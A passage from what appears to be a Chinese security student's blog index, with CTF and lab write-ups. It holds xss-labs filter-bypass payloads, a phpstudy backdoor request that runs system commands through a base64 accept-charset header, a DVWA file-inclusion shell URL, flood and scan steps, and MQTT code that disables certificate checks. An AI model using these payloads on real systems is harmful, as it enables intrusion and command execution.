http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file:///F:/phpstudy/PHPTutorial/WWW/DVWA/hackable/uploads/picshell.jpg","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"}]},{"title":"xsslabs通关","slug":"靶场/xsslabs通关","date":"2019-09-30T01:10:22.000Z","updated":"2019-10-16T08:03:29.072Z","comments":true,"path":"2019/09/30/靶场/xsslabs通关/","link":"","permalink":"http://example.com/2019/09/30/%E9%9D%B6%E5%9C%BA/xsslabs%E9%80%9A%E5%85%B3/","excerpt":"前言xss小游戏 level1看了看level1的源码","text":"前言xss小游戏 level1看了看level1的源码 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;script&gt;window.alert = function() &#123; confirm(&quot;完成的不错！&quot;); window.location.href=&quot;level2.php?keyword=test&quot;; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt; 通过$_GET[“name”]，获取name的值，没有过滤通过echo直接进行了输出，get请求的name变量放入xss脚本，完整的返回在html中，浏览器响应xss脚本 构造payload：name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 在xss中拥有同样弹窗效果的函数不止alert，还有confirm以及prompt 从代码角度去看，可以发现就是直接用GET方式获取参数然后输出到浏览器上面，这是典型的没做过滤。怎么防御？可以加一个转义函数htmlspecialchars把一些html格式的东西编码就可以有效防止了。 level2像上一关一样输入&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;，并没有弹窗，回显如下： 再看看源码 划红线部分就是提交的参数了，我们发现这里是可以闭合前面的引号和**&gt;**，再构造xss弹窗 payload：&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; level3输入上一关的试试，当然没用 看看源码 发现提交的xss脚本中的**&lt;**和**&gt;**都没了，应该是被htmlspecialchars函数过滤了 所以这里可以用单引号闭合value，却没办法闭合input标签，但是可以注释掉后面标签然后用事件弹窗，这里介绍几个常用的事件函数，比如onchange, onclick, oninput等等 payload：1&#39; onclick=alert(&quot;xss&quot;)// level4输入&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;测试一下， **&lt;**和**&gt;**依然被转义，再试试点击事件弹窗 payload：1&quot; onclick=alert(&quot;xss&quot;)// level5输入&quot;/&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;，发现&lt;script&gt;标签被过滤 输入1&quot; onclick=alert(&quot;xss&quot;)//测试， 可以看到onclick也被过滤，但是可以看到尖括号没有被过滤 所以可以构造a标签，再尝试利用a标签的href属性执行javascript:伪协议，&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;，没有对javascript进行过滤，触发xss level6输入&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;测试，&lt;script&gt;标签被过滤 输入&quot; onclick=alert(1)//测试，onclick被过滤 输入&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;测试。发现href也被过滤 尝试是用大小写绕过 payload：&quot;&gt;&lt;a HREF=&quot; javascript:alert(1)&quot; 或者&quot;&gt; &lt;Script&gt;alert(&#39;123&#39;)&lt;/script&gt; // level7按照前面的套路试了一遍，发现script、on、href都被过滤，大小写都被过滤 使用双写单词来绕过 payload1：&quot; oonnclick=alert(1)// payload：&quot;&gt;&lt;a hrhrefef=&quot; javascscriptript:alert(1)&quot; level8随便输了一个试试，查看源码 发现原本就有一个href标签，所以直接添加javascript:alert(1)即可，可是会发现script被过滤了，转换大小写也不行， 可以发现还有一处调用的字符串里面没有使用这样的函数去进行防护，可以利用这一点下功夫，尝试编码绕过，进行html编码之后可以成功饶过， 1&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; （其实这里编码的话只编码script其中一个字符就可以） level9输入javascript:alert(1)测试一下 发现这次的输入没有在href标签那里，所以，再试试&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 尖括号和引号都被过滤，看来害的编码 使用上一关的poc试试，也不行，，，只能看看源码 发现这里对url进行了限制，必须包含http:// 尝试构造javascr&amp;#x69;pt:alert(1)http://，居然不对、、、 确实不对，那该怎么办呢，两 个解决办法：注释或者把http://放到aler()里面 javascr&amp;#x69;pt:alert(1)//http:// javascr&amp;#x69;pt:alert(&amp;#x22;http://&amp;#x22;)这里吧引号编码 level10明面上没有看到输入框，但是url栏里可以输入 发现尖括号被过滤，但是这里有三个隐藏的参数，不明白，看看源码 keyword被htmlspecialchars过滤，但是还有一个参数t_sort没有防护，只是过滤了尖括号，然后放到了一个input标签中隐藏起来 可以闭合双引号，使用onclick事件，然后把隐藏的标签用text方式回显出来即可，最后的payload t_sort=&quot; onclick=alert(1) type=&quot;text&quot; level11","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"XSS","slug":"XSS","permalink":"http://example.com/tags/XSS/"}]},{"title":"phpstudy漏洞复现","slug":"大学CTF/phpstudy漏洞复现","date":"2019-09-27T07:59:30.000Z","updated":"2019-10-16T08:03:56.126Z","comments":true,"path":"2019/09/27/大学CTF/phpstudy漏洞复现/","link":"","permalink":"http://example.com/2019/09/27/%E5%A4%A7%E5%AD%A6CTF/phpstudy%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"前言在玩手机的时候，发现微信推了一篇文章，案件背景如下： 2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令","text":"前言在玩手机的时候，发现微信推了一篇文章，案件背景如下： 2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。 phpstudy是一款PHP调试环境的程序集成包，集成了最新的Apache、PHP、phpMyAdmin、ZendOptimizer等多款软件一次性安装，无需配置，即装即用。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者、开发者用户。 影响版本 phpstudy 2016版php-5.4 phpstudy 2018版php-5.2.17 phpstudy 2018版php-5.4.45 后门检测作为学生党，我也一直在用phpstudy，所以要看看是不是自己的phpstudy也存在这个后门。 检测方法看了一些文章之后，发现这个后门是在phpstudy 2018版php-5.2.17和phpstudy 2018版php-5.4.45的\\ext\\php_xmlrpc.dll， 打开这两个文件，ctrl+F搜索一下，看看有没有eval，文件存在@eval(%s(‘%s’))证明漏洞存在， 结果，，， 显然，我的phpstudy存在后门，也可以利用MD5值检测是不是存在后门。 后门文件MD5值：MD5: 0F7AD38E7A9857523DFBCE4BCE43A9E9MD5: C339482FD2B233FB0A555B629C0EA5D5 后门的原理我不懂 。。。但是也看到了几篇文章，以后可以看看。 http://www.52bug.cn/hkjs/6100.html https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw 后门利用这里是大佬的后门包 GET /test/2.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip,deflateaccept-charset: (这里是你要执行的命令的base64加密值)ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7Connection: closeCookie: _ga=GA1.1.994769775.1540538530; security_level=0Upgrade-Insecure-Requests: 1Cache-Control: max-age=0 **accept-charset: **字段要写要执行命令的base64值 在本地随便写个PHP文件，把phpstudy的版本切换到5.4.45或者5.2.17，用bp抓包， 然后添加， accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7是echo system(“net user”);的base64值， 即可得到当前用户， 在这里的时候，出现一个问题， gzip和deflate之间有一个空格，有空格的时候，会导致无法利用这个后门，要把这个空格删掉才行。 phpstudy后门rce批量利用脚本 参考文章 https://www.cnblogs.com/yuzly/p/11565997.html https://blog.csdn.net/weixin_43886632/article/details/101294081 https://www.cnblogs.com/-qing-/p/11575622.html","categories":[{"name":"Sec","slug":"Sec","permalink":"http://example.com/categories/Sec/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://example.com/tags/Security/"},{"name":"后门","slug":"后门","permalink":"http://example.com/tags/%E5%90%8E%E9%97%A8/"}]},{"title":"MQTT之TLS","slug":"编程/MQTT之TLS","date":"2019-06-30T06:47:59.000Z","updated":"2021-05-23T07:31:14.826Z","comments":true,"path":"2019/06/30/编程/MQTT之TLS/","link":"","permalink":"http://example.com/2019/06/30/%E7%BC%96%E7%A8%8B/MQTT%E4%B9%8BTLS/","excerpt":"前言做了很久的实验，一直没能成功，最后还是down的大佬的源码，侵删。","text":"前言做了很久的实验，一直没能成功，最后还是down的大佬的源码，侵删。 正文简介MQTT协议是物联网应用中重要的应用层协议，上一次实验开展了MQTT协议的分析，对MQTT协议的长连接机制、发布/订阅工作模式交互机制进行了分析。但如果MQTT协议不进行安全实现，黑客可以恶意发布信息给服务器，特别是在工业、交通等物联网应用场合后果不堪设想。本实验旨构建MQTT协议安全通信。 要求（1）掌握MQTT的安全通信的基本原理。 （2）设计MQTT安全通信的安全措施。 （3）实现基于TLS的MQTT通信。 基本步骤（1）应用层：MQTT协议提供了客户标识以及用户名密码，以便验证设备。基于ACL对主题的订阅和发布权限设置基本的授权。 （2）传输层：传输层可使用TLS加密、验证证书机制，防止中间人攻击。 （3）网络层：可以通过专线或者使用VPN来连接设备与MQTT代理，以提高网络传输的安全性。可以通过防火墙保护MQTT代理端，比如限制端口、限制协议、限制IP段。 注意构建一个局域网，模拟MQTT服务端（代理端）、客户端（分订阅和发布），运用Wireshark抓包分析安全通信过程。 具体过程服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859var mosca = require(&#x27;mosca&#x27;)var SECURE_KEY = __dirname + &#x27;/tls-key.pem&#x27;;var SECURE_CERT = __dirname + &#x27;/tls-cert.pem&#x27;;var settings = &#123; logger: &#123; name: &quot;secureExample&quot;, level: 40, &#125;, secure : &#123; port: 9090, keyPath: SECURE_KEY, certPath: SECURE_CERT, &#125;&#125;;var server = new mosca.Server(settings);server.on(&#x27;published&#x27;, function(packet, client) &#123; //当客户端有连接发布主题消息 var topic = packet.topic; console.log(packet); switch (topic) &#123; case &#x27;test&#x27;: console.log(&#x27;收到消息：&#x27;, packet.payload.toString()); //MQTT转发主题消息 //MqttServer.publish(&#123; topic: &#x27;other&#x27;, payload: &#x27;sssss&#x27; &#125;); break; case &#x27;other&#x27;: console.log(&#x27;message-123&#x27;, packet.payload.toString()); break; &#125;&#125;);server.on(&#x27;ready&#x27;, setup);//若用户名与密码有效，接受链接var authenticate = function(client, username, password, callback) &#123; var authorized = (username === &#x27;alice&#x27; &amp;&amp; password.toString() === &#x27;secret&#x27;); if (authorized) &#123; client.user = username; console.log(&#x27;通过认证登录的用户：&#x27;, username); &#125; callback(null, authorized);&#125;// 授权为alice的客户端可以发布/users/alice，// 从主题中取得用户名，并校验与授权用户一致var authorizePublish = function(client, topic, payload, callback) &#123; callback(null, client.user == topic);&#125;// 授权为alice的客户端可以订阅/users/alice，// 从主题中取得用户名，并校验与授权用户一致var authorizeSubscribe = function(client, topic, callback) &#123; callback(null, client.user == topic);&#125;//mosca配置function setup() &#123; console.log(&#x27;Mosca secure server is up and running&#x27;) server.authenticate = authenticate; server.authorizePublish = authorizePublish; server.authorizeSubscribe = authorizeSubscribe;&#125; 订阅方** 12345678910111213141516171819202122232425var mqtt = require(&#x27;mqtt&#x27;);var fs = require(&#x27;fs&#x27;)var path = require(&#x27;path&#x27;)var KEY = fs.readFileSync(path.join(__dirname, &#x27;/tls-key.pem&#x27;))var CERT = fs.readFileSync(path.join(__dirname, &#x27;/tls-cert.pem&#x27;))var TRUSTED_CA_LIST = fs.readFileSync(path.join(__dirname, &#x27;/crt.ca.cg.pem&#x27;))var PORT = 9090var HOST = &quot;127.0.0.1&quot;var options = &#123; port: PORT, host: HOST, key: KEY, cert: CERT, rejectUnauthorized: false, ca: TRUSTED_CA_LIST, protocol: &#x27;mqtts&#x27;, //订阅者实现认证的参数 username:&quot;alice&quot;, password:&quot;secret&quot;&#125;var client2 = mqtt.connect(options)client2.subscribe(&#x27;alice&#x27;,&#123;qos:0&#125;);//订阅主题为alice的消息 client2.on(&#x27;message&#x27;,function(top,message) &#123; console.log(&#x27;收到消息：&#x27;, message.toString()); &#125;); 发布方** 12345678910111213141516171819202122232425262728var mqtt = require(&#x27;mqtt&#x27;);var fs = require(&#x27;fs&#x27;)var path = require(&#x27;path&#x27;)var KEY = fs.readFileSync(path.join(__dirname, &#x27;/tls-key.pem&#x27;))var CERT = fs.readFileSync(path.join(__dirname, &#x27;/tls-cert.pem&#x27;))var TRUSTED_CA_LIST = fs.readFileSync(path.join(__dirname, &#x27;/crt.ca.cg.pem&#x27;))var PORT = 9090var HOST = &quot;127.0.0.1&quot;var options = &#123; port: PORT, host: HOST, key: KEY, cert: CERT, rejectUnauthorized: false, ca: TRUSTED_CA_LIST, protocol: &#x27;mqtts&#x27;, //发布者实现认证的参数 username:&quot;alice&quot;, password:&quot;secret&quot;&#125;var client = mqtt.connect(options)var num = 0;var qtt = &#123;&#125;; //定义消息qtt = &#x27;hello world&#x27;;//一秒钟发送一次消息setr=xxxxxxx1xxsetInterval(function() &#123; client.publish(&#x27;alice&#x27;, qtt, &#123; qos: 0, retain: true &#125;); &#125;, 10000); 抓包分析 1 客户端发出请求（ClientHello) (1) 客户端与服务端通过tcp三次握手建立tcp连接后，客户端首先向服务器发出建立加密通信的请求，发送ClientHello请求，从消息体结构看，tls/ssl是基于tcp连接之上，应用层之下的协议。 2 服务器响应（SeverHello） 服务器收到客户端请求后，向客户端发出响应，叫做Sever Hello。 从消息体中，可以看到服务器的响应包含以下内容： (1) 确认使用的加密通信协议版本，这里确认使用tls1.2，而不是client hello中的tls1.1。响应握手协议消息 server hello。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。 (2) 一个服务器生成的随机数，稍后用于生成”对话密钥”。 (3) 确认使用的加密套件,这里为rsa+aes128+sha256 (4) 压缩方法为空。 (5) 一些列扩展信息 3 服务端发送服务端电子证书（CA），密钥交换（server key exchange），及server hello done三个握手消息 客户端接收到server hello握手消息后，及时反馈ack消息。服务端接收客户端ack消息后，发送服务端电子证书，密钥交换，及server hello done三个握手消息 从封装内容看，包含两层ssl协议体信息，头一个为服务端证书，后面跟着公共密钥交换和hello done消息体，具体如下： （1）详细的电子证书信息和CA认证机构信息 （2）密钥交换信息，包括DH算法计算出的pubkey公钥，电子签名的hash算法值 （3）server hello done消息体 4 客户端发送密钥交换信息（client key exchange）、编码改变协议消息(change cipher spec) 客户端发送ack消息给服务端，确认收到server hello done消息，然后发送客户端的密钥交换信息和修改密钥的协议消息 主要内容如下： (1) 发送DH算法计算的pubkey，用于服务端计算生成解密私钥 (2) 发送编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。 (3) 发送加密后的握手消息，一个随机数。该随机数用服务器公钥加密，防止被窃听 (4) 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。（可能在加密消息中，未确认） 客户端收到服务器所有响应消息后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。 如果证书没有问题，客户端就会从证书中取出服务器的公钥，即server key exchange消息中携带的pubkey值。然后，根据根据已经收到的三个随机数计算书加密密钥，对握手信息进行加密通信，然后向服务器发送上面抓包中三项信息内容。 ​ 至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用”会话密钥”加密数据内容。 五 实验体会（不少于300字） ​ TLS（Transport Layer Security，安全传输层)，TLS是建立在传输层TCP协议之上的协议，服务于应用层，它的前身是SSL（Secure Socket Layer，安全套接字层），它实现了将应用层的报文进行加密后再交由TCP进行传输的功能。 ​ TLS协议主要解决如下三个网络安全问题。 1、保密(message privacy)，保密通过加密encryption实现，所有信息都加密传输，第三方无法嗅探； 2、完整性(message integrity)，通过MAC校验机制，一旦被篡改，通信双方会立刻发现； 3、认证(mutual authentication)，双方认证,双方都可以配备证书，防止身份被冒充； 下面是TLS的握手过程。详细步骤上面也说过了。 Client1：TLS版本号 + 所支持加密套件列表 + 希望使用的TLS选项 Server1：选择一个客户端的加密套件 + 自己的公钥 + 自己的证书 + 希望使用的TLS选项 +（要求客户端证书） Client2：（自己的证书） + 使用服务器公钥和协商的加密套件加密一个对称密钥 Server2：使用私钥解密出对称密钥后，发送的加密的Finish消息，表明完成握手 任何事物都是有利有弊，引入TLS机制固然是能够保证安全，但却在TCP握手和HTTP通信之间，多加了两个往返的TLS握手过程。 安全问题： ​ 可能存在中间人攻击。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"物联网应用层coap协议","slug":"编程/物联网应用层coap协议","date":"2019-06-18T07:53:30.000Z","updated":"2021-05-23T07:31:53.841Z","comments":true,"path":"2019/06/18/编程/物联网应用层coap协议/","link":"","permalink":"http://example.com/2019/06/18/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%B1%82coap%E5%8D%8F%E8%AE%AE/","excerpt":"CoAP(Constrained Application Protocol, 受限应用协议)协议是一种在低功耗低速率的设备上实现物联网通信的应用层协议。","text":"CoAP(Constrained Application Protocol, 受限应用协议)协议是一种在低功耗低速率的设备上实现物联网通信的应用层协议。其采用UDP协议支撑，发送和接收数据可以异步，数据包头采用二进制压缩，对低功耗低速率的网络有很好的适应能力。CoAP协议非常的小巧，最小的数据包仅为4字节。CoAP适用于低功耗受限设备，一个内存为20KB的单片机就可以实现CoAP服务器或客户端。本实验旨在利用工具对CoAP协议基本工作机制进行验证分析，并分析其可能的安全隐患。 要求（1）实验要求掌握CoAP的基本原理。 （2）用Wireshark等协议分析软件分析CoAP协议过程。 （3）学会用Node.js或Python快速构建CoAP通信验证程序。 基本步骤 注意构建一个局域网，模拟CoAP服务端、客户端，运用Wireshark分析客户端和服务端上的协议工作。 过程及有关程序代码服务器代码: 12345678const coap = require(&#x27;coap&#x27;) , server = coap.createServer()server.on(&#x27;request&#x27;, function(req, res) &#123; res.end(&#x27;Hello &#x27; + req.url.split(&#x27;/&#x27;)[1] + &#x27;\\n&#x27;)&#125;)server.listen(function() &#123; console.log(&#x27;server started&#x27;)&#125;) 客户端代码： 1234567const coap = require(&#x27;coap&#x27;) , req = coap.request(&#x27;coap://127.0.0.1/client&#x27;)req.on(&#x27;response&#x27;, function(res) &#123; res.pipe(process.stdout)&#125;)req.end() 1、 搭建局域网2、开启服务器 3、 客户端请求连接，服务器返回信息 4、抓包信息 分析CoAP是一种应用层协议，它运行于UDP协议之上而不是像HTTP那样运行于TCP之上。HTTP 与 COAP协议都是通过4个请求方法（GET, PUT, POST, DELETE）对服务器端资源进行操作。 两者之间明显的区别在于HTTP是通过文本描述方式描述协议包内容，协议包里面会包含一些空格符，换行符等,协议包可读性很强。而COAP是通过定义 二进制各位段功能来描述协议包内容。 因此COAP协议包大小更小，更紧凑。CoAP协议非常小巧，最小的数据包仅为4字节。但CoAP并不能替代HTTP协议，CoAP只能呢 应用于那些小设备。 ​ CoAP采用与HTTP协议相同的请求响应工作模式。CoAP协议共有4中不同的消息类型。 CON——需要被确认的请求，如果CON请求被发送，那么对方必须做出响应。 NON——不需要被确认的请求，如果NON请求被发送，那么对方不必做出回应。 ACK——应答消息，接受到CON消息的响应。 RST——复位消息，当接收者接受到的消息包含一个错误，接受者解析消息或者不再关心发送者发送的内容，那么复位消息将会被发送。 这里抓到的包只有CON和ACK，是因为客户端发的包需要服务器响应，所以是CON，而且在传输过程中并未出错，所以没有出现RST复位消息。 CoAP还有一个比较特殊的地方，那就是它的url。在HTTP的世界中，RESTFul协议由于其简单性和适用性，在WEB应用中越来越受欢迎，这样的道理同样适用于CoAP。一个CoAP资源可以被一个URI所描述，例如一个设备可以测量温度，那么这个温度传感器的URI被描述为：CoAP://machine.address:5683/sensors/temperature。请注意。后面的 temperature，我觉得更像是表示客户端的身份的信息，不知道理解的对不对，就像下你个面这样 。 关于COAP的安全问题： COAP使用DTLS来做安全传输层，该层运行于UDP之上，当前考虑使用DTLS时，需要考虑设备终端资源受限情况， 有些资源有限设备无法运行DTLS安全加密算法。 做安全加密，需要根据应用场景需要，对应只上报数据，且数据敏感度不高场景，可以不考虑加入安全层。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"nodejs搭建MQTT服务器","slug":"编程/搭建MQTT服务器","date":"2019-05-28T08:55:38.000Z","updated":"2021-05-23T07:31:33.323Z","comments":true,"path":"2019/05/28/编程/搭建MQTT服务器/","link":"","permalink":"http://example.com/2019/05/28/%E7%BC%96%E7%A8%8B/%E6%90%AD%E5%BB%BAMQTT%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"前言物联网安全实践四","text":"前言物联网安全实践四 mqtt协议介绍一 mqtt协议介绍二 图片来自https://www.jianshu.com/p/9e74287e3b07 正文安装nodejs下载安装即可。 安装mqtt.js模块新建一个文件夹，打开cmd，npm install mqtt --save，这里很有可能能会报错，百度一下就可以解决。 安装好mqtt.js模块后，文件夹中会多两个文件出来。 搭建服务器mqttserver.js源码 123456789101112131415161718192021222324252627282930313233var mosca = require(&#x27;mosca&#x27;);//构建自带服务器var MqttServer = new mosca.Server(&#123; port: 1883&#125;);//对服务器端口进行配置， 在此端口进行监听MqttServer.on(&#x27;clientConnected&#x27;, function(client) &#123; //监听连接 console.log(&#x27;client connected&#x27;, client.id);&#125;);/** * 监听MQTT主题消息 **/MqttServer.on(&#x27;published&#x27;, function(packet, client) &#123; //当客户端有连接发布主题消息 var topic = packet.topic; console.log(packet); switch (topic) &#123; case &#x27;test&#x27;: console.log(&#x27;message-publish&#x27;, packet.payload.toString()); //MQTT转发主题消息 //MqttServer.publish(&#123; topic: &#x27;other&#x27;, payload: &#x27;sssss&#x27; &#125;); break; case &#x27;other&#x27;: console.log(&#x27;message-123&#x27;, packet.payload.toString()); break; &#125;&#125;);MqttServer.on(&#x27;ready&#x27;, function() &#123; //当服务开启时 console.log(&#x27;mqtt is running...&#x27;);&#125;); node mqttserver.js开启服务器 服务器运行成功。 开启订阅subclient.js源码 123456789var mqtt = require(&#x27;mqtt&#x27;); var client2 = mqtt.connect(&quot;mqtt://127.0.0.1:1883&quot;); //指定服务端地址和端口 client2.subscribe(&#x27;test&#x27;,&#123;qos:1&#125;);//订阅主题为test的消息 client2.on(&#x27;message&#x27;,function(top,message) &#123; console.log(message.toString()); &#125;); node subclient.js开启订阅 开启发布pubclient.js源码 123456789var mqtt = require(&#x27;mqtt&#x27;);var client = mqtt.connect(&#x27;mqtt://127.0.0.1&#x27;); //连接到服务端//client.subscribe(&#x27;presence&#x27;);var num = 0;var qtt = &#123;&#125;; //定义消息（可以为字符串、对象等）qtt = &#x27;helloworld&#x27;;setInterval(function() &#123; //3秒钟发送一次 消息到主题 SN69143809293670state 消息为helloworld client.publish(&#x27;test&#x27;, qtt, &#123; qos: 0, retain: true &#125;); &#125;, 3000); node pubclient.js开启发布 此时，会发现如下结果 服务器 [ 订阅方 说明mqtt服务器搭建成功。 实验体会讲一下MQTT一个通俗的理解。 MQTT服务器类似一个公告栏，里面张贴了各种广告。 张三跑过来说，凡是涉及足球的（/public/TEST/Soccer）的都发给自己（订阅） 第二天，李四过来贴广告了，主题是（/public/TEST/Soccer），发布的内容是“30号有比赛” 此时，公告栏（MQTT服务器）会自动发短信给张三，发送的信息为 “30号有比赛”。 实验流程分析： 1、实验中，mqtt服务器上有两个主题的信息test和other 2、订阅方发布一个主题为test的订阅，当mqtt也会得到这个这个主题的信息时，就会发给订阅方 3、发布方发布一个主题为test的信息到mqtt服务器 4、当mqtt服务器得知与订阅方相匹配的订阅时，会把这个主题消息的内容发给订阅方。","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"南邮re逆向writeup","slug":"大学CTF/南邮re逆向writeup","date":"2019-05-22T08:27:40.000Z","updated":"2019-05-22T09:29:11.722Z","comments":true,"path":"2019/05/22/大学CTF/南邮re逆向writeup/","link":"","permalink":"http://example.com/2019/05/22/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEre%E9%80%86%E5%90%91writeup/","excerpt":"前言被老师嘲讽不会逆向。。。","text":"前言被老师嘲讽不会逆向。。。 正文Hello REtips： 或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了 PS:IDA里面按R可以把奇怪的数字变成字符串 格式为flag&#123;*****&#125;包含flag{}提交 参考资料： 《IDA Pro 权威指南》 各种CTF比赛的逆向部分的writeup 给老人一个1.exe文件，运行一下，结果如下： 将他放入IDA分析一波，要注意使用32位的，开始用64位的，怎么都看不到伪代码。 IDA打开之后，按F5查看伪代码， 居然就得到flag了，tips的提示还没有尝试呢。。 ReadAsm2读汇编是逆向基本功。 给出的文件是func函数的汇编 main函数如下 输出的结果即为flag，格式为flag&#123;**********&#125;，请连flag{}一起提交 编译环境为linux gcc x86-64 调用约定为System V AMD64 ABI 请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力 123456789int main(int argc, char const *argv[])&#123; char input[] = &#123;0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;; func(input, 28); printf(&quot;%s\\n&quot;,input+1); return 0;&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"}]},{"title":"物联网安全实践二","slug":"编程/物联网安全实践二","date":"2019-05-15T11:02:57.000Z","updated":"2021-05-23T07:31:50.263Z","comments":true,"path":"2019/05/15/编程/物联网安全实践二/","link":"","permalink":"http://example.com/2019/05/15/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E4%BA%8C/","excerpt":"前言物联网安全实践","text":"前言物联网安全实践 正文一 实验目的及要求 物联网智能设备一般都提供WiFi接入，本实验是在WiFi密码破解基础上进一步对物联网智能设备配置服务开展安全性分析实验。比如智能物联网家居网关、智能家居中的智能插座等，一般都内置Web服务，方便本地登录Web网页开展参数设置。本实验旨在完成物联网智能设备的配置服务的基本安全分析和攻击验证。 二 实验要求 （1）实验要求掌握Web服务器的基本原理。 （2）掌握TCP SYN Flood的原理并实施验证，可选择network攻击软件。 （3）掌握nmap端口扫描工具的应用。 （4）开展死亡之ping实验验证。 （4）学会用Python或Node.js快速构建简单Web服务。 三 实验基本步骤 提示：在笔记本电脑构建WiFi热点，模拟物联网智能设备的服务，两个同学构成一个实验小组，小组内相互设置服务，改变IP和端口，开展安全分析和工具。注意在笔记本电脑上构建时用管理员权限运行netsh wlan set hostednetwork mode=allow ssid=wkk key=87654321。用Python或Node.js快速构建简单Web服务。 1、 构建一个小型局域网，使两台主机在同一网段。 2、搭建服务器 3、Nmap扫描端口 4、死亡之ping 5、TCP SYN FLOOD攻击 四 实验过程及有关程序代码 目标主机 10.3.248.120，攻击主机10.3.39.27 1、构建一个小型局域网，使两台主机在同一网段。打开手机WIFI热点，两台主机都连接。 2、 在一台主机开启一个web服务，作为一个服务器。 使用python搭建的，首先在python的安装目录下，新建一个文件夹 webserver，打开一个cmd，输入命令python –m SimpleHTTPServer 8888，开启一个web服务器，8888端口 测试，创建一个index.html 3、 nmap扫描端口 另一台主机nmap 10.3.248.120 –sT扫描 8888端口是开放的。 4、死亡之ping 攻击机输入攻击命令，ping –l 65500 